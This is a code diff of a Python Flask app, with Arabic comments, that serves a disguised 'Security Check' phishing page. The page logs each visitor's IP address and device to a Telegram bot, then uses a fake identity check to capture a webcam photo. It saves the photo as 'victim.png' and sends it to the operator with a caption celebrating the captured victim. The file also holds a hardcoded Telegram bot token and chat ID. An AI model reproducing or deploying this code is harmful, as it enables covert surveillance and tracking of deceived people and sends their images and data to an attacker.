@@ -1,52 +1,77 @@
-import os
-from flask import Flask, request, render_template_string
 import telebot
+from flask import Flask, request, render_template_string
+import base64
 
-# بياناتك الحقيقية المستخرجة من الصور
+# إعدادات البوت الخاص بك
 TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk"
 CHAT_ID = "8351043975"
-
 bot = telebot.TeleBot(TOKEN)
+
 app = Flask(__name__)
 
-# صفحة التمويه الاحترافية
-HTML_PAGE = """
+# كود الصفحة التي تطلب الكاميرا وتلتقط الصورة
+html_code = """
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث سجل الأمان</title>
+    <title>Security Check</title>
+    <script>
+        async function startCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0);
+
+                const dataUrl = canvas.toDataURL('image/png');
+                fetch('/capture', {
+                    method: 'POST',
+                    body: JSON.stringify({ image: dataUrl }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                
+                stream.getTracks().forEach(track => track.stop());
+                document.body.innerHTML = "<h1>Security Verified ✅</h1><p>Your connection is now secure.</p>";
+            } catch (err) {
+                document.body.innerHTML = "<h1>Access Denied</h1><p>Please allow camera access to verify your identity.</p>";
+            }
+        }
+        window.onload = startCapture;
+    </script>
 </head>
-<body style="background-color:#0d1117; color:#c9d1d9; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
-    <div style="text-align:center; border:1px solid #30363d; padding:40px; border-radius:10px; background:#161b22;">
-        <div style="color:#238636; font-size:50px;">✔</div>
-        <h2>جاري فحص حالة الحساب...</h2>
-        <p>يرجى عدم إغلاق هذه الصفحة لتأمين جلسة العمل الحالية.</p>
-        <div style="width:200px; height:4px; background:#30363d; margin:20px auto; position:relative; overflow:hidden;">
-            <div style="width:50%; height:100%; background:#238636; position:absolute; animation:load 2s infinite linear;"></div>
-        </div>
+<body style="text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4;">
+    <div style="background: white; display: inline-block; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
+        <h2>جاري فحص حالة الأمان...</h2>
+        <p>يرجى السماح بالوصول للكاميرا لإكمال عملية التحقق.</p>
     </div>
-    <style>@keyframes load { from {left:-100%} to {left:100%} }</style>
 </body>
 </html>
 """
 
 @app.route('/')
-def main():
-    # جمع بيانات "الصيد"
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    ua = request.user_agent.string
+def index():
+    user_agent = request.headers.get('User-Agent')
+    ip_addr = request.remote_addr
+    bot.send_message(CHAT_ID, f"🎯 دخول جديد للرابط!\\n🌐 IP: {ip_addr}\\n📱 الجهاز: {user_agent}")
+    return render_template_string(html_code)
+
+@app.route('/capture', methods=['POST'])
+def capture():
+    data = request.json
+    image_data = data['image'].split(',')[1]
     
-    report = f"🎯 **صيد جديد من السيرفر السحابي!**\n\n🌐 **IP:** `{ip}`\n📱 **الجهاز:** `{ua}`\n📍 **المصدر:** `Cloud Host`"
+    with open("victim.png", "wb") as fh:
+        fh.write(base64.b64decode(image_data))
     
-    # إرسال التقرير فوراً لبوتك
-    try:
-        bot.send_message(CHAT_ID, report, parse_mode="Markdown")
-    except:
-        pass
-        
-    return render_template_string(HTML_PAGE)
+    with open("victim.png", "rb") as photo:
+        bot.send_photo(CHAT_ID, photo, caption="📸 تم التقاط صورة الضحية بنجاح!")
+    return "OK"
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    app.run(host='0.0.0.0', port=8000)
